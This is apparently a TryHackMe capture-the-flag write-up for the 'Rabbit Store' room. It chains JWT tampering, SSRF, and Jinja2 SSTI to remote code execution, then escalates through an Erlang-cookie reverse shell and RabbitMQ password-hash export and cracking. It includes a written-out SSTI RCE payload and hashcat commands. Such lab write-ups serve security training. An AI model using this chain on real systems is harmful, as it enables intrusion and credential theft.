# TryHackMe Rabbit Store Writeup
![alt text](/Medium/Rabbit%20Store/Images/image.png)

## Overview
Demonstrate your web application testing skills and the basics of Linux to escalate your privileges.

---

## Table of Contents
- [Overview](#overview)
- [Recon & Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)

---

## Recon & Enumeration
```zsh
➜  ~ nmap -sS -vv -A -p- -T4 cloudsite.thm
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 61 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    syn-ack ttl 61 Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown syn-ack ttl 61
```

```zsh
➜  ~ gobuster dir -u http://cloudsite.thm -w /usr/share/wordlists/dirb/common.txt -xtxt,php,html,js -t30
/about_us.html        (Status: 200) [Size: 9992]
/assets               (Status: 301) [Size: 315] [--> http://cloudsite.thm/assets/]
/blog.html            (Status: 200) [Size: 10939]
/contact_us.html      (Status: 200) [Size: 9914]
/index.html           (Status: 200) [Size: 18451]
/javascript           (Status: 301) [Size: 319] [--> http://cloudsite.thm/javascript/]
/server-status        (Status: 403) [Size: 278]
/services.html        (Status: 200) [Size: 9358]
Progress: 23070 / 23075 (99.98%)
```

```zsh
➜  ~ gobuster dir -u http://storage.cloudsite.thm -w /usr/share/wordlists/dirb/common.txt -xtxt,php,html,js -t30
/assets               (Status: 301) [Size: 331] [--> http://storage.cloudsite.thm/assets/]
/css                  (Status: 301) [Size: 328] [--> http://storage.cloudsite.thm/css/]
/fonts                (Status: 301) [Size: 330] [--> http://storage.cloudsite.thm/fonts/]
/images               (Status: 301) [Size: 331] [--> http://storage.cloudsite.thm/images/]
/index.html           (Status: 200) [Size: 9039]
/javascript           (Status: 301) [Size: 335] [--> http://storage.cloudsite.thm/javascript/]
/js                   (Status: 301) [Size: 327] [--> http://storage.cloudsite.thm/js/]
/register.html        (Status: 200) [Size: 9043]
/server-status        (Status: 403) [Size: 286]
Progress: 23070 / 23075 (99.98%)
```

+ Testing page `http://cloudsite.thm` --> No potential flaws. 
+ Access page `http://storage.cloudsite.thm` --> Page has 2 features `Login` and `Register`.
+ We try to login default credential but not work. We switch to `/register.html` to create new account and log in again.
+ Login with registered account but account is `inactive`

![alt text](/Medium/Rabbit%20Store/Images/image-1.png)

+ Using `Burp Suite` to intercept the request: 

![alt text](/Medium/Rabbit%20Store/Images/image-2.png)

--> We found the header cookie is `jwt`. Using website [Jwt](https://www.jwt.io/) to decode `JWT`:

![alt text](/Medium/Rabbit%20Store/Images/image-3.png)

--> Parameter `subscription` is the potential. We can switch from `inactive` to `active`.

---

## Exploitation

+ The request `/api/login`, we see the `Content-type` is `application/json` --> We can add `subscription` to active the account.

![alt text](/Medium/Rabbit%20Store/Images/image-4.png)

--> We login new account and status is `active`. Checking new cookie `jwt`

![alt text](/Medium/Rabbit%20Store/Images/image-5.png)

+ Access dashboard, we have 2 features that are `/upload` and `/store-url`. Both features upload file through `API`.

+ Testing feature `/upload':

--> Idea first will update to get reverse shell but the page has the `extension filter` so we can't upload file with malicious code.

![alt text](/Medium/Rabbit%20Store/Images/Screenshot%20from%202025-08-17%2019-07-21.png)

+ Testing feature `store-url`, the feature upload from url. Back to the proxy `Burp Suite`:

![alt text](/Medium/Rabbit%20Store/Images/Screenshot%20from%202025-08-17%2019-13-37.png)

--> We have the potential parameter `url` to upload so we think first the potential vulnerability `SSRF` to manipulate url. We try the payload to confirm is `SSRF` appear.

+ We test with normal payload `http://localhost/` or `http://127.0.0.1/`. The file upload to `/api/upload/...` so access and check the file.

![alt text](/Medium/Rabbit%20Store/Images/image-6.png)

--> We can access url `http://cloudsite.thm` through localhost so we can confirm the feature has the vulnerability `SSRF` (Server-Side Request Forgery).

+ We've known the url or file upload through /api so we will fuzz to find the hidden endpoints in API:

![alt text](/Medium/Rabbit%20Store/Images/Screenshot%20from%202025-08-17%2019-28-20.png)

--> The hidden endpoints `docs` but access denied so we can access /docs by SSRF.

+ We need to find the way to access `http://storage.cloudsite.thm` through `localhost`. Try `Bypassing filters` still does not work so we can fuzz the `Ports`:

![alt text](/Medium/Rabbit%20Store/Images/image-7.png)

--> Bing!!! We have port 3000 can bypass and upload /api/docs.

***Note: Port 3000 is Express Server, if we check the technology in this page with `Wappalyzer` we will find the page is using both servers Express and Apache.***

+ Access the file:

![alt text](/Medium/Rabbit%20Store/Images/image-8.png)

--> Now we can read the file and find the another hidden endpoint API `/api/fetch_messeges_from_chatbot` with method POST.

+ Testing `/api/fetch_messeges_from_chatbot`:

![alt text](/Medium/Rabbit%20Store/Images/image-9.png)

***Note: This page using API REST so the normal content-type is `application/json` if we don't use this content-type so we will get the error 500(Internal Server).***

+ Add parameter `username`:

![alt text](/Medium/Rabbit%20Store/Images/image-10.png)

--> We've seen the reflect `username` so we can check the potential vulnerabilities are `SSTI` and `XSS`.

![alt text](/Medium/Rabbit%20Store/Images/image-11.png)

--> Reflect payload `{{7*7}}` 49 so we confirm that `SSTI` (Server-Side Template Injection) appeared and template is `Jinja2`.

+ We still use feature `Scan active` in `Burp Suite`:

![alt text](/Medium/Rabbit%20Store/Images/image-12.png)

+ Now we can chain SSTI to RCE and we found the payload to RCE in here [RCE](https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3).

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![alt text](/Medium/Rabbit%20Store/Images/image-13.png)

---

## Privilege Escalation

+ Using script `Linpeas.sh` to scan vectors privilege, we find the potential file:

![alt text](/Medium/Rabbit%20Store/Images/image-14.png)

--> Cookie of service `Rabbitmq`. With the erlang cookie, we can access intital Rabbit through RCE.

+ We use script [Erl-Matter](https://github.com/gteissier/erl-matter) to create revershell access intial service `Rabbitmq`:

![alt text](/Medium/Rabbit%20Store/Images/image-15.png)

+ Research `Rabbitmq` and find how to use service --> Read more about using service in Document [Rabbitmq](https://www.rabbitmq.com/docs/cli).

+ If we recive the error when running command:
```
11:07:58.049 [error] Cookie file ./.erlang.cookie must be accessible by owner only
```
--> We need to grant owner permission `chmod 600 <erlang.cookie>` and run command agin.

+ Using `rabbitmqctl` to list the available user with command:

```
rabbitmq@forge:~$ rabbitmqctl list_users
rabbitmqctl list_users
Listing users ...
user    tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.        []
root    [administrator]
```
--> The user `root` is available and we can retrive the password but we can't crack the password_hash.

+ Using `Schema Definition Export` to export user data contains password hashes as well as password hashing function information.

```
rabbitmq@forge:~/schema$ rabbitmqctl export_definitions rabbit.json
rabbitmqctl export_definitions rabbit.json
Exporting definitions in JSON to a file at "rabbit.json" ...
```

```
rabbitmq@forge:~$ cat rabbit.json
cat rabbit.json
{"bindings":[],"exchanges":[],"global_parameters":[{"name":"cluster_name","value":"rabbit@forge"}],"parameters":[],"permissions":[{"configure":".*","read":".*","user":"root","vhost":"/","write":".*"}],"policies":[],"queues":[{"arguments":{},"auto_delete":false,"durable":true,"name":"tasks","type":"classic","vhost":"/"}],"rabbit_version":"3.9.13","rabbitmq_version":"3.9.13","topic_permissions":[{"exchange":"","read":".*","user":"root","vhost":"/","write":".*"}],"users":[{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.","password_hash":"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K","tags":[]},{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"root","password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF","tags":["administrator"]}],"vhosts":[{"limits":[],"metadata":{"description":"Default virtual host","tags":[]},"name":"/"}]}
```
--> We've gotten account `root:9e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF`.

+ We can read more the information [Algorithm Hash Password](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm).

+ Using [Password Cracking](https://github.com/qkaiser/cottontail/issues/27#issuecomment-1608711032) to convert and crack the password:

```
echo 49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > hash.txt
hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt
```

![alt text](/Medium/Rabbit%20Store/Images/image-16.png)

+ We have the hash: `295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585:e3d7ba85`.

+ Using the hash to login user `root`:

![alt text](/Medium/Rabbit%20Store/Images/image-17.png)
---